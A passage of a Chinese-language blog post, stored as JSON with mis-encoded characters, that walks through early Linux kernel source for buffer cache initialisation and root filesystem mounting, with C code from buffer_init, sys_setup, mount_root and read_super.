- read \u0026 write","author":"fangfeng","date":"2018-11-11T00:00:00.000Z","tags":["Linux","Kernel","File System","read \u0026 write"],"content":"\u003cp\u003e\u003ca href=\"https://dormouse-none.github.io/2018-10-14-understand-Kernel-5/\"\u003eå‰ä¸€ç¯‡\u003c/a\u003eå·²ç»æè¿°å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº†å®è§‚æ€§çš„æè¿°ï¼Œè¿™ä¸€ç¯‡ï¼Œå°†ä»¥ç‰¹å®šçš„æ–‡ä»¶è¯»å†™æ“ä½œä¸ºç¤ºä¾‹ï¼Œä¸²è”å¯¹æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬æ“ä½œã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå…ˆæ¥çœ‹çœ‹å¹³å°ç›¸å…³çš„æ–‡ä»¶è¯»å†™æ“ä½œçš„ C ä»£ç æ˜¯æ€æ ·ä¸€ä¸ªè°ƒç”¨æ–¹å¼\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#include \u0026#x3C;stdio.h\u003e\n#include \u0026#x3C;stdlib.h\u003e\n#include \u0026#x3C;string.h\u003e\n#include \u0026#x3C;unistd.h\u003e\n#include \u0026#x3C;fcntl.h\u003e\n#include \u0026#x3C;errno.h\u003e\n#include \u0026#x3C;sys/types.h\u003e\n#include \u0026#x3C;sys/stat.h\u003e\n\nint panic()\n{\n    fprintf(stderr, \"%s (errno=%d)\\n\", strerror(errno), errno);\n    return -1;\n}\n\nint main(int argc, char *argv[])\n{\n    /* æ‰“å¼€æ–‡ä»¶ frw.txt (ä»¥å¯è¯»å†™ | è‹¥ä¸å­˜åœ¨åˆ™æ–°å»ºçš„å½¢å¼) */\n    int fd = open(\"/root/frw.txt\", O_RDWR | O_CREAT);\n    if (fd == -1)\n        return panic();\n\n    /* å‘æ–‡ä»¶å†™å…¥ Hello World! å…±è®¡ 12 ä¸ªå­—ç¬¦ */\n    ssize_t wsize = write(fd, \"Hello World!\", 12);\n    if (wsize == -1)\n        return panic();\n\n    /* é‡å®šä½æ–‡ä»¶è¯»å†™æŒ‡é’ˆ */\n    off_t off = lseek(fd, 0, SEEK_SET);\n    if (off == -1)\n        return panic();\n\n    char* buf = (char *) malloc(wsize);\n    /* è¯»å–æ–‡ä»¶å†…å®¹ */\n    ssize_t rsize = read(fd, buf, wsize);\n    if (rsize == -1)\n        return panic();\n\n    printf(\"%s\\n\", buf);\n    free(buf);\n    /* å…³é—­æ–‡ä»¶ */\n    int stat = close(fd);\n    if (stat == -1)\n        return panic();\n\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eé«˜é€Ÿç¼“å†²åŒºåˆå§‹åŒ–\u003c/h2\u003e\n\u003cp\u003eä¸Šä¸€ç¯‡å·²ç»æè¿°è¿‡äº†ï¼Œæ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„ã€åŒ…æ‹¬æ•°æ®ï¼Œéƒ½æ˜¯æŒä¹…åŒ–åœ°å­˜å‚¨åœ¨å­˜å‚¨è®¾å¤‡ä¸­çš„ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œæˆ‘ä»¬åº”è¯¥ä¹Ÿéšçº¦çš„äº†è§£å¦ä¸€ä¸ªäº‹å®ï¼Œæ–‡ä»¶è¯»å†™æ“ä½œå¹¶ä¸ä¼šç›´æ¥æ“ä½œå­˜å‚¨è®¾å¤‡ä¸Šçš„æ•°æ®ï¼Œè€Œæ˜¯å…ˆç»è¿‡ä¸€ä¸ªç§°ä¹‹ä¸ºé«˜é€Ÿç¼“å†²çš„å†…å­˜åŒºåŸŸã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œé«˜é€Ÿç¼“å†²æ˜¯ä»€ä¹ˆ? ç©¶ç«Ÿæ‰¿æ‹…ä»€ä¹ˆå·¥ä½œ? å…ˆæ¥çœ‹çœ‹å®ƒçš„åˆå§‹åŒ–æµç¨‹å§ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå›åˆ° \u003ccode\u003emain.c\u003c/code\u003e (å†…æ ¸ä»£ç çš„ä¸»å‡½æ•°)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid main(void) \n{\n    ROOT_DEV = ORIG_ROOT_DEV;\n    drive_info = DRIVE_INFO;\n    memory_end = (1\u0026#x3C;\u0026#x3C;20) + (EXT_MEM_K\u0026#x3C;\u0026#x3C;10);\n    memory_end \u0026#x26;= 0xfffff000;\n    if (memory_end \u003e 16*1024*1024)\n        memory_end = 16*1024*1024;\n    if (memory_end \u003e 12*1024*1024)\n        buffer_memory_end = 4*1024*1024;\n    else if (memory_end \u003e 6*1024*1024)\n        buffer_memory_end = 2*1024*1024;\n    else\n        buffer_memory_end = 1*1024*1024;\n    main_memory_start = buffer_memory_end;\n#ifdef RAMDISK\n    main_memory_start += rd_init(main_memory_start, RAMDISK*1024);\n#endif\n    mem_init(main_memory_start,memory_end);\n    trap_init();\n    blk_dev_init();\n    chr_dev_init();\n    tty_init();\n    time_init();\n    sched_init();                       // ç¬¬å››ç¯‡å·²ç»è®²è¿‡ï¼Œè´Ÿè´£ä»»åŠ¡è°ƒåº¦æ¨¡å—çš„åˆå§‹åŒ–\n    buffer_init(buffer_memory_end);     // æœ¬ç¯‡çš„èµ·å§‹ï¼Œè´Ÿè´£ç¼“å†²åŒºçš„åˆå§‹åŒ–\n    hd_init();\n    floppy_init();\n    sti();\n    move_to_user_mode();\n    if (!fork()) {      /* we count on this going ok */\n        init();\n    }\n    for(;;) pause();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ebuffer_init(buffer_memory_end);\u003c/code\u003e ç”¨æ¥åˆå§‹åŒ–ç¼“å†²åŒºã€‚æ­¤å¤„æœ‰å‡ ä¸ªåŸå› :\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCPU è¯»å†™æ“ä½œå¦‚æœç›´æ¥æ“ä½œå¤–å­˜ï¼Œé€Ÿåº¦ä¸Šæ˜¯ä¸€ä¸ªæå¤§çš„è€ƒéªŒã€‚æ¯•ç«Ÿå†…å­˜å·²ç»è¾ƒä¹‹ CPU é€Ÿåº¦æ…¢ï¼Œå¤–å­˜çš„è¯»å†™é€Ÿåº¦å°±æ›´æ…¢äº†ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè§£è€¦ï¼Œå…¶å®è¯»å†™æ“ä½œå¹¶ä¸ä»…ä»…å‘ç”Ÿåœ¨å¤–å­˜(å—å­˜å‚¨è®¾å¤‡)ï¼ŒåŒæ ·çš„ï¼Œå­—ç¬¦è®¾å¤‡ç­‰ç­‰ä¹Ÿéƒ½ä¼šéœ€è¦è¯»å†™æ“ä½œï¼Œå¢åŠ ä¸­é—´å±‚å¯ä»¥å°è£…å˜åŒ–ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ›´å¤šï¼Œä¸ªäººäº†è§£æœ‰é™...\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estruct buffer_head {\n char * b_data;\n unsigned long b_blocknr;\n unsigned short b_dev;\n unsigned char b_uptodate;\n unsigned char b_dirt;\n unsigned char b_count;\n unsigned char b_lock;\n struct task_struct * b_wait;\n struct buffer_head * b_prev;\n struct buffer_head * b_next;\n struct buffer_head * b_prev_free;\n struct buffer_head * b_next_free;\n};\n\n/* from fs/buffer.c */\nvoid buffer_init(long buffer_end)\n{\n    struct buffer_head * h = start_buffer;\n    void * b;\n    int i;\n\n    if (buffer_end == 1\u0026#x3C;\u0026#x3C;20)\n        b = (void *) (640*1024);\n    else\n        b = (void *) buffer_end;\n    while ( (b -= BLOCK_SIZE) \u003e= ((void *) (h+1)) ) {\n        h-\u003eb_dev = 0;\n        h-\u003eb_dirt = 0;\n        h-\u003eb_count = 0;\n        h-\u003eb_lock = 0;\n        h-\u003eb_uptodate = 0;\n        h-\u003eb_wait = NULL;\n        h-\u003eb_next = NULL;\n        h-\u003eb_prev = NULL;\n        h-\u003eb_data = (char *) b;\n        h-\u003eb_prev_free = h-1;\n        h-\u003eb_next_free = h+1;\n        h++;\n        NR_BUFFERS++;\n        /* è·³è¿‡ 640K ~ 1M çš„æ˜¾å­˜å’Œ BIOS RAM éƒ¨åˆ† */\n        if (b == (void *) 0x100000)\n            b = (void *) 0xA0000;\n    }\n    h--;\n    free_list = start_buffer;\n    free_list-\u003eb_prev_free = h;\n    h-\u003eb_next_free = free_list;\n    for (i=0;i\u0026#x3C;NR_HASH;i++)\n        hash_table[i]=NULL;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eç¼“å†²å—çš„æ‰€æœ‰å…³é”®ä¿¡æ¯éƒ½ç”± \u003ccode\u003ebuffer_head\u003c/code\u003e æ•°æ®ç»“æ„è¿›è¡Œè®°å½•, è‡³äºæœ‰å¤šå°‘ä¸ª \u003ccode\u003ebuffer_head\u003c/code\u003e? åªèƒ½è¯´èƒ½åˆ’åˆ†å¤šå°‘å°±åˆ’åˆ†å¤šå°‘ã€‚\u003c/p\u003e\n\u003cp\u003eæ¯”è¾ƒç›´è§‚çš„ç»“æ„ä¿¡æ¯å¦‚ä¸‹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws2.sinaimg.cn/large/006tNbRwly1fwy2iag1exj31kw0k1dgb.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨ \u003ccode\u003emain.c\u003c/code\u003e ä¸­å·²ç»æå‰ç¡®è®¤äº†å†…æ ¸ç¨‹åºå ç”¨å†…å­˜çš„å¤§å°ï¼Œç¼“å†²åŒºå¤§å°ä»¥åŠä¸»å†…å­˜å¤§å°ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨é«˜é€Ÿç¼“å†²åŒºçš„å¼€å§‹ä½ç½®ï¼Œéƒ½ç”¨æ¥å­˜å‚¨ \u003ccode\u003ebuffer_head\u003c/code\u003e çš„ä¿¡æ¯ï¼Œä¸æ¯ä¸ªç¼“å†²å—(ä»ç¼“å†²åŒºç»“æŸä½ç½®å¼€å§‹åˆ†é…)ä¸€ä¸€å¯¹åº”ï¼Œç›´åˆ°ä¸­é—´æŸä¸ªä½ç½®ä¸è¶³ä»¥åˆ†é…ç¼“å†²å—ä¸ºæ­¢ã€‚\u003c/p\u003e\n\u003cp\u003eå¦å¤–çš„ä¿¡æ¯ï¼Œå°±æ˜¯å¯ä»¥çœ‹åˆ°ä¸€ä¸ª \u003ccode\u003ehash_table\u003c/code\u003e æ•°æ®ç»“æ„äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåº”è¯¥éƒ½èƒ½å¤Ÿæƒ³è±¡ï¼Œæ¯ä¸ªç¼“å­˜å—ä¸å¤–å­˜ä¸­çš„æ•°æ®å—ç›¸å¯¹åº”ï¼Œé€šè¿‡è®¾å¤‡å· + æ•°æ®å—å·è¿›è¡Œå”¯ä¸€å®šä½ã€‚ä½†æ˜¯ï¼Œå¦‚ä½•å¿«é€ŸæŸ¥æ‰¾éœ€è¦æ“ä½œçš„æ•°æ®å—æ˜¯å¦å·²ç»å­˜åœ¨ä¸é«˜é€Ÿç¼“å­˜ä¸­äº†å‘¢? æ˜¾ç„¶ç›´æ¥éå†æŸ¥æ‰¾æ˜¯ä¸å¤ªå¯é çš„åŠæ³•ã€‚é‡‡ç”¨å¼€æ”¾åœ°å€æ³•çš„å“ˆå¸Œè¡¨èƒ½å¤ŸååŠ©å¿«é€Ÿå®šä½ç¼“å†²å—ã€‚\u003c/p\u003e\n\u003ch2\u003eæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ\u003c/h2\u003e\n\u003cp\u003eæ—¢ç„¶é«˜é€Ÿç¼“å†²åŒºéƒ½å‡†å¤‡å°±ç»ªäº†ï¼Œé‚£ä¹ˆæ–‡ä»¶ç³»ç»Ÿæ˜¯å¦å·²ç»æŒ‚è½½äº†å‘¢? å¾ˆé—æ†¾ï¼ŒçŸ¥é“ \u003ccode\u003emain()\u003c/code\u003e è°ƒç”¨ \u003ccode\u003einit()\u003c/code\u003e å‡½æ•°ä¹‹å‰ï¼Œæ–‡ä»¶ç³»ç»Ÿä¾ç„¶æ²¡æœ‰æŒ‚è½½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒCPU ä»ç„¶åªèƒ½é€šè¿‡åŸºæœ¬è¾“å…¥è¾“å‡ºå¯¹å­˜å‚¨è®¾å¤‡è¿›è¡Œç›¸å½“åˆçº§çš„ IO æ“ä½œã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œä»€ä¹ˆæ—¶å€™æ‰èƒ½å»æŒ‚è½½æ ¹ç›®å½•å‘¢?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/* from init/main.c */\n/* ç”± main() è§¦å‘ */\nvoid init(void)\n{\n    int pid,i;\n    /* è¿™æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç¯äº†ï¼Œå¼€å§‹æŒ‚è½½çš„èµ·å§‹åŠ¨ä½œ */\n    setup((void *) \u0026#x26;drive_info);\n    ...\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003esetup\u003c/code\u003e å‡½æ•°åšäº†ä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯ä¸€ä¸ªå†…åµŒæ±‡ç¼–ï¼Œä¸»è¦åšçš„å°±æ˜¯è§¦å‘ç³»ç»Ÿè°ƒç”¨ \u003ccode\u003eint 0x80\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003e__inline__ int setup(void * BIOS) { \n    long __res; \n    __asm__ volatile (\n            \"int $0x80\" \n            : \"=a\" (__res) \n            : \"0\" (0),\"b\" ((long)(BIOS))\n    ); \n    if (__res \u003e= 0) \n        return (int) __res; \n    errno = -__res; \n    return -1; \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå…¶ä¸­çœ‹åˆ°ç»™å‡ºçš„ \u003ccode\u003eEAX = 0\u003c/code\u003e, æŸ¥è¡¨(è¡¨åœ¨ \u003ccode\u003einclude/linux/sys.h\u003c/code\u003e é‡Œ) å¯ä»¥çŸ¥é“è§¦å‘çš„æ˜¯ \u003ccode\u003esys_setup\u003c/code\u003e å‡½æ•°(å‡½æ•°ä½äº \u003ccode\u003ekernel/blk_drv/hd.c\u003c/code\u003e)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/* This may be used only once, enforced by 'static int callable' */\nint sys_setup(void * BIOS)\n{\n    static int callable = 1;\n    int i,drive;\n    unsigned char cmos_disks;\n    struct partition *p;\n    struct buffer_head * bh;\n\n    /* setup åªå…è®¸è¢«è°ƒç”¨ä¸€æ¬¡ */\n    if (!callable)\n        return -1;\n    callable = 0;\n    /* å¯ä»¥å¼ºåˆ¶åœ¨æºç ä¸­æŒ‡å®šç¡¬ç›˜å‚æ•°, æ‰€ä»¥åŠ äº†å®å®šä¹‰ä½œåˆ¤æ–­*/\n#ifndef HD_TYPE\n    for (drive=0 ; drive\u0026#x3C;2 ; drive++) {\n        hd_info[drive].cyl = *(unsigned short *) BIOS;\n        hd_info[drive].head = *(unsigned char *) (2+BIOS);\n        hd_info[drive].wpcom = *(unsigned short *) (5+BIOS);\n        hd_info[drive].ctl = *(unsigned char *) (8+BIOS);\n        hd_info[drive].lzone = *(unsigned short *) (12+BIOS);\n        hd_info[drive].sect = *(unsigned char *) (14+BIOS);\n        BIOS += 16;\n    }\n    if (hd_info[1].cyl)\n        NR_HD=2;\n    else\n        NR_HD=1;\n#endif\n    for (i=0 ; i\u0026#x3C;NR_HD ; i++) {\n        hd[i*5].start_sect = 0;\n        hd[i*5].nr_sects = hd_info[i].head*\n                hd_info[i].sect*hd_info[i].cyl;\n    }\n\n    /*\n        We querry CMOS about hard disks : it could be that\n        we have a SCSI/ESDI/etc controller that is BIOS\n        compatable with ST-506, and thus showing up in our\n        BIOS table, but not register compatable, and therefore\n        not present in CMOS.\n\n        Furthurmore, we will assume that our ST-506 drives\n        \u0026#x3C;if any\u003e are the primary drives in the system, and\n        the ones reflected as drive 1 or 2.\n\n        The first drive is stored in the high nibble of CMOS\n        byte 0x12, the second in the low nibble.  This will be\n        either a 4 bit drive type or 0xf indicating use byte 0x19\n        for an 8 bit type, drive 1, 0x1a for drive 2 in CMOS.\n\n        Needless to say, a non-zero value means we have\n        an AT controller hard disk for that drive.\n\n\n    */\n\n    if ((cmos_disks = CMOS_READ(0x12)) \u0026#x26; 0xf0)\n        if (cmos_disks \u0026#x26; 0x0f)\n            NR_HD = 2;\n        else\n            NR_HD = 1;\n    else\n        NR_HD = 0;\n    for (i = NR_HD ; i \u0026#x3C; 2 ; i++) {\n        hd[i*5].start_sect = 0;\n        hd[i*5].nr_sects = 0;\n    }\n    /* æ›´è¿›ä¸€æ­¥è®¾ç½®æ¯ä¸ªç›˜çš„å‚æ•° */\n    for (drive=0 ; drive\u0026#x3C;NR_HD ; drive++) {\n        /* 0x300 å’Œ 0x305 åˆ†åˆ«ä»£è¡¨ä¸¤ä¸ªç¡¬ç›˜ */\n        /* è¯»å–æ¯ä¸ªç¡¬ç›˜çš„ç¬¬ä¸€å—æ•°æ® (1024B) */\n        if (!(bh = bread(0x300 + drive*5,0))) {\n            printk(\"Unable to read partition table of drive %d\\n\\r\",\n                drive);\n            panic(\"\");\n        }\n        /* åˆ¤æ–­ç¡¬ç›˜æœ‰æ•ˆæ€§ */\n        if (bh-\u003eb_data[510] != 0x55 || (unsigned char)\n            bh-\u003eb_data[511] != 0xAA) {\n            printk(\"Bad partition table on drive %d\\n\\r\",drive);\n            panic(\"\");\n        }\n        /* è¯»å–åˆ†åŒºè¡¨ (ä½äº å¼•å¯¼æ‰‡åŒºç¬¬ 446 å­—èŠ‚å¼€å§‹å¤„ */\n        p = 0x1BE + (void *)bh-\u003eb_data;\n        for (i=1;i\u0026#x3C;5;i++,p++) {\n            hd[i+5*drive].start_sect = p-\u003estart_sect;\n            hd[i+5*drive].nr_sects = p-\u003enr_sects;\n        }\n        brelse(bh);\n    }\n    if (NR_HD)\n        printk(\"Partition table%s ok.\\n\\r\",(NR_HD\u003e1)?\"s\":\"\");\n    rd_load();              /* å°è¯•åˆ›å»ºå¹¶åŠ è½½è™šæ‹Ÿç›˜ */\n    mount_root();           /* mount æ ¹æ–‡ä»¶ç³»ç»Ÿ */\n    return (0);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eç»ˆäºåˆ°äº†æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿçš„æ—¶å€™äº†\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emount_root\u003c/code\u003e ç”¨æ¥åšåˆçº§çš„åˆå§‹åŒ–å·¥ä½œã€‚åŒæ—¶ï¼Œä¸Šä¸€èŠ‚å·²ç»æè¿°è¿‡äº†ï¼Œå­˜å‚¨è®¾å¤‡çš„è¶…çº§å—æ˜¯ç”¨äº†è®°å½•æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿæœ€é‡è¦çš„ç»“æ„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆé€šè¿‡å°†è¶…çº§å—çš„ä¿¡æ¯è¯»å–åˆ°å†…å­˜ï¼Œä¹Ÿå°±å¯ä»¥å°†å†…å­˜ä¸å¤–å­˜çš„æ–‡ä»¶ç³»ç»Ÿç›¸äº’è”ç³»èµ·æ¥äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¿™æ®µä»£ç æœ€é‡è¦çš„å†…å®¹å°±æ˜¯ \u003ccode\u003eread_super()\u003c/code\u003e å‡½æ•°äº† .\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid mount_root(void)\n{\n    int i,free;\n    struct super_block * p;\n    struct m_inode * mi;\n\n    if (32 != sizeof (struct d_inode))\n        panic(\"bad i-node size\");\n    /* å…ˆåˆå§‹åŒ–æ–‡ä»¶è¡¨ï¼Œè¯¥ç‰ˆæœ¬æ“ä½œç³»ç»Ÿé™åˆ¶æœ€å¤§åŒæ—¶æ‰“å¼€ NR_FILE(64ä¸ª) æ–‡ä»¶ */\n    for(i=0;i\u0026#x3C;NR_FILE;i++)\n        /* f_count = 0 è¡¨æ˜æ²¡æœ‰è¢«å¼•ç”¨ */\n        file_table[i].f_count=0;\n    /* å¦‚æœå¼•å¯¼ç›˜æ˜¯è½¯ç›˜çš„è¯ï¼Œæç¤ºæ’å…¥æ ¹æ–‡ä»¶ç³»ç»Ÿç›˜ */\n    if (MAJOR(ROOT_DEV) == 2) {\n        printk(\"Insert root floppy and press ENTER\");\n        wait_for_keypress();\n    }\n    /* åˆå§‹åŒ–å†…å­˜è¶…çº§å—æ•°æ®ç»“æ„ (æ€»å…± 8 ä¸ª) */\n    for(p = \u0026#x26;super_block[0] ; p \u0026#x3C; \u0026#x26;super_block[NR_SUPER] ; p++) {\n        p-\u003es_dev = 0;\n        p-\u003es_lock = 0;\n        p-\u003es_wait = NULL;\n    }\n    /* Hint: è¯»å–è¶…çº§å—çš„ä¿¡æ¯ï¼ŒæŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿé‡è¦çš„éƒ¨åˆ†(ä»£ç è¯·å¾€ä¸‹ç¿») */\n    if (!(p=read_super(ROOT_DEV)))\n        panic(\"Unable to mount root\");\n    /* è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„ 1 å·ièŠ‚ç‚¹ (å³è¯¥è®¾å¤‡ä¸Šæ–‡ä»¶ç³»ç»Ÿçš„æ ¹èŠ‚ç‚¹) */\n    if (!(mi=iget(ROOT_DEV,ROOT_INO)))\n        panic(\"Unable to read root i-node\");\n    mi-\u003ei_count += 3 ;  /* NOTE! it is logically used 4 times, not 1 */\n    p-\u003es_isup = p-\u003es_imount = mi;\n    /* åº”è¯¥è¿˜è®°å¾—å§ï¼Œcurrent æŒ‡çš„æ˜¯å½“å‰çš„ä»»åŠ¡(ä»»åŠ¡1)ï¼Œä»¥åæ‰€æœ‰çš„ä»»åŠ¡éƒ½ä¼šç”±ä»»åŠ¡1æˆ–ä»»åŠ¡1çš„å­ä»»åŠ¡è¿›è¡Œæ´¾ç”Ÿï¼Œä¹Ÿå°±æ„å‘³ç€ current-\u003eroot ä¼šä¸€ç›´å¤åˆ¶è¿‡å»\n     * åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œåº”è¯¥è®¤ä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿä»¥åŠè¢«æŒ‚è½½äº†ã€‚æ˜¯ä¸æ˜¯è·Ÿè¢«è€äº†ä¸€æ ·?\n     */\n    current-\u003epwd = mi;\n    current-\u003eroot = mi;\n    free=0;\n    i=p-\u003es_nzones;\n    /* ç»Ÿè®¡è¿˜æœ‰å¤šå°‘ç©ºé—²æ•°æ®å—ä»¥åŠå¤šå°‘å¯ç”¨ièŠ‚ç‚¹ (é™„ä¸Šä¸€å¼ å¯åŠ¨è¿‡ç¨‹ä¸­æ‰“å°çš„ä¿¡æ¯) */\n    while (-- i \u003e= 0)\n        if (!set_bit(i\u0026#x26;8191,p-\u003es_zmap[i\u003e\u003e13]-\u003eb_data))\n            free++;\n    printk(\"%d/%d free blocks\\n\\r\",free,p-\u003es_nzones);\n    free=0;\n    i=p-\u003es_ninodes+1;\n    while (-- i \u003e= 0)\n        if (!set_bit(i\u0026#x26;8191,p-\u003es_imap[i\u003e\u003e13]-\u003eb_data))\n            free++;\n    printk(\"%d/%d free inodes\\n\\r\",free,p-\u003es_ninodes);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fwz8kvvgbpj30l006i3yb.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eé‡è¦è¦çš„éƒ¨åˆ†ï¼Œ\u003ccode\u003eread_super(int dev)\u003c/code\u003eï¼Œç”¨äºè¯»å–è¶…çº§å—çš„æ•°æ®\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estatic struct super_block * read_super(int dev)\n{\n    struct super_block * s;\n    struct buffer_head * bh;\n    int i,block;\n\n    if (!dev)\n        return NULL;\n    check_disk_change(dev);\n    /* å¦‚æœè¯¥è¶…çº§å—å·²ç»åœ¨å†…å­˜ä¸­äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä½¿ç”¨ (å’Œè¿™é‡ŒæŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿçš„æµç¨‹æ— å…³) */\n    if (s = get_super(dev))\n        return s;\n    /* è®¾å¤‡è¶…çº§å—ä¸åœ¨å†…å­˜ä¸­ï¼Œå°±å…ˆæ‰¾ä¸€ä¸ªç©ºé—²çš„å†…å­˜è¶…çº§å— (æ€»å…±ç»´æŠ¤ 8 ä¸ªè¶…çº§å—æ•°æ®ç»“æ„) */\n    for (s = 0+super_block ;; s++) {\n        if (s \u003e= NR_SUPER+super_block)\n            return NULL;\n        if (!s-\u003es_dev)\n            break;\n    }\n    s-\u003es_dev = dev;\n    s-\u003es_isup = NULL;\n    s-\u003es_imount = NULL;\n    s-\u003es_time = 0;\n    s-\u003es_rd_only = 0;\n    s-\u003es_dirt = 0;\n    lock_super(s);\n    /* é€šè¿‡ block read è¯»å–è®¾å¤‡ç¬¬ä¸€ä¸ªç‰©ç†å— (æ¯ä¸ªç‰©ç†å— 1024 B) */\n    if (!(bh = bread(dev,1))) {\n        s-\u003es_dev=0;\n        free_super(s);\n        return NULL;\n    }\n    /* å¤åˆ¶ä¸€ä»½è¶…çº§å—çš„æ•°æ® */\n    *((struct d_super_block *) s) =\n        *((struct d_super_block *) bh-\u003eb_data);\n    /* é‡Šæ”¾ç¼“å†²åŒºçš„æ•°æ® */\n    brelse(bh);\n    /* éªŒè¯é­”æ•°, è¯¥ç‰ˆæœ¬æ“ä½œç³»ç»Ÿåªæ”¯æŒ 1.0 ç‰ˆ Minix æ–‡ä»¶ç³»ç»Ÿï¼Œé­”æ•° 0x137F */\n    if (s-\u003es_magic != SUPER_MAGIC) {\n        s-\u003es_dev = 0;\n        free_super(s);\n        return NULL;\n    }\n    /* å…ˆæ¸…ç©ºå†…å­˜ä¸­çš„æ•°æ® */\n    for (i=0;i\u0026#x3C;I_MAP_SLOTS;i++)\n        s-\u003es_imap[i] = NULL;\n    for (i=0;i\u0026#x3C;Z_MAP_SLOTS;i++)\n        s-\u003es_zmap[i] = NULL;\n    block=2;\n    /* è¯»å– i èŠ‚ç‚¹ä½å›¾å— */\n    for (i=0 ; i \u0026#x3C; s-\u003es_imap_blocks ; i++)\n        if (s-\u003es_imap[i]=bread(dev,block))\n            block++;\n        else\n            break;\n    /* è¯»å–æ•°æ®å—ä½å›¾ */\n    for (i=0 ; i \u0026#x3C; s-\u003es_zmap_blocks ; i++)\n        if (s-\u003es_zmap[i]=bread(dev,block))\n            block++;\n        else\n            break;\n    if (block != 2+s-\u003es_imap_blocks+s-\u003es_zmap_blocks) {\n        for(i=0;i\u0026#x3C;I_MAP_SLOTS;i++)\n            brelse(s-\u003es_imap[i]);\n        for(i=0;i\u0026#x3C;Z_MAP_SLOTS;i++)\n            brelse(s-\u003es_zmap[i]);\n        s-\u003es_dev=0;\n        free_super(s);\n        return NULL;\n    }\n    s-\u003es_imap[0]-\u003eb_data[0] |= 1;\n    s-\u003es_zmap[0]-\u003eb_data[0] |= 1;\n    /* ä¸å‰é¢çš„ wait_on_super() å¯¹åº”(è§£å¼€lockæ ‡å¿—) */\n    free_super(s);\n    return s;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæ˜¯ä¸æ˜¯è§‰å¾—ä¹Ÿæ²¡ä»€ä¹ˆï¼Œå°±è¿™æ ·æ ¹æ–‡ä»¶ç³»ç»Ÿå·²ç»æŒ‚è½½äº†? æ¯«æ— å®æ„Ÿæ˜¯å§ã€‚\u003c/p\u003e\n\u003ch2\u003eExtra: æ™®é€šæŒ‚è½½\u003c/h2\u003e\n\u003cp\u003eæ—¢ç„¶è®²è¿‡äº†æ ¹æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ã€‚é‚£å°±é¡ºå¸¦ç€è®²è®²æ™®é€šæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½å§ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸ä¿¡ä»å‘½ä»¤ä¸Šæ¥è®²åº”è¯¥æ¯”è¾ƒç®€å•ä¹Ÿæ¯”è¾ƒç†Ÿæ‚‰å§ã€‚\u003ccode\u003emount disk.img /mnt\u003c/code\u003e ä¹Ÿç®—æ˜¯æŒ‚è½½åˆ° /mnt ä¸‹äº†\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç©¶ç«Ÿæ˜¯æ€ä¹ˆå®ç°çš„å‘¢?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint sys_mount(char * dev_name, char * dir_name, int rw_flag)\n{\n    struct m_inode * dev_i, * dir_i;\n    struct super_block * sb;\n    int dev;\n\n    /** \n     * çœç•¥å¤§éƒ¨åˆ†åˆ¤æ–­é€»è¾‘, ä¸»è¦å°±æ˜¯:\n     * 1. åˆ¤æ–­ dev_name æ‰€å±çš„è®¾å¤‡å·ï¼Œè¯»å–è¯¥è®¾å¤‡ä¸Šçš„è¶…çº§å—\n     * 2. è¯»å– dir_name 